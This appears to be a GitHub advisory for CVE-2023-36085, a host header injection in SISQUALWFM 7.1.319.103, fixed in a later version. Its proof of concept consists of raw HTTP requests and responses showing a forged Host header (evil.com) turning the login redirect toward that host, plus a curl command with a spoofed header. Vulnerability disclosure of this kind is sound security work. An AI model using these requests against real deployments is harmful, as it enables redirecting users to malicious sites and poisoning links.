# CVE-2023-36085 SISQUALWFM Host Header Injection Vulnerability

This repository contains information related to a host header injection vulnerability discovered in SISQUALWFM version 7.1.319.103, which allows an attacker to manipulate webpage links or redirect users to a malicious site. This vulnerability was assigned CVE-2023-36085 and has been fixed in version 7.1.319.111 and above.

## Vulnerability Details

- **Exploit Title:** SISQUALWFM 7.1.319.103 Host Header Injection
- **Discovered Date:** 17/03/2023
- **Reported Date:** 17/03/2023
- **Resolved Date:** 13/10/2023
- **Exploit Author:** Omer Shaik (unknown_exploit)
- **Vendor Homepage:** [SISQUALWFM](https://www.sisqualwfm.com)
- **Version:** 7.1.319.103
- **Tested on:** SISQUAL WFM 7.1.319.103
- **Affected Version:** SISQUALWFM 7.1.319.103
- **Fixed Version:** SISQUALWFM 7.1.319.111
- **CVE:** CVE-2023-36085
- **CVSS Score:** 3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
- **Category:** Web Apps

## Proof of Concept

We provide a proof-of-concept scenario demonstrating the host header injection vulnerability, specifically targeting the `/sisqualIdentityServer/core` endpoint. This vulnerability allows an attacker to manipulate webpage links or redirect users to another site by tampering with the host header.

### Original Request

```http
GET /sisqualIdentityServer/core/login HTTP/2
Host: sisqualwfm.cloud
Cookie: <cookie>
...
```

### Original Response

```http
HTTP/2 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Location: https://sisqualwfm.cloud/sisqualIdentityServer/core/
...
```

### Intercepted Request (Modified to Redirect to evil.com)

```http
GET /sisqualIdentityServer/core/login HTTP/2
Host: evil.com
Cookie: <cookie>
...
```

### Response

```http
HTTP/2 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Location: https://evil.com/sisqualIdentityServer/core/
...
```

![Exploit Execution](https://github.com/omershaik0/Handmade_Exploits/blob/main/SISQUALWFM-Host-Header-Injection-CVE-2023-36085/redirect.png)

## Method of Attack

To exploit this vulnerability, an attacker can use the following `curl` command to modify the host header:

```bash
curl -k --header "Host: attack.host.com" "Domain Name + /sisqualIdentityServer/core" -vvv
```

## Disclaimer

This repository is for informational purposes only and should not be used for any malicious activities. The vulnerability has been responsibly disclosed to the vendor, and the issue has been resolved. It is crucial to follow ethical hacking guidelines and respect responsible disclosure practices when identifying and reporting vulnerabilities.
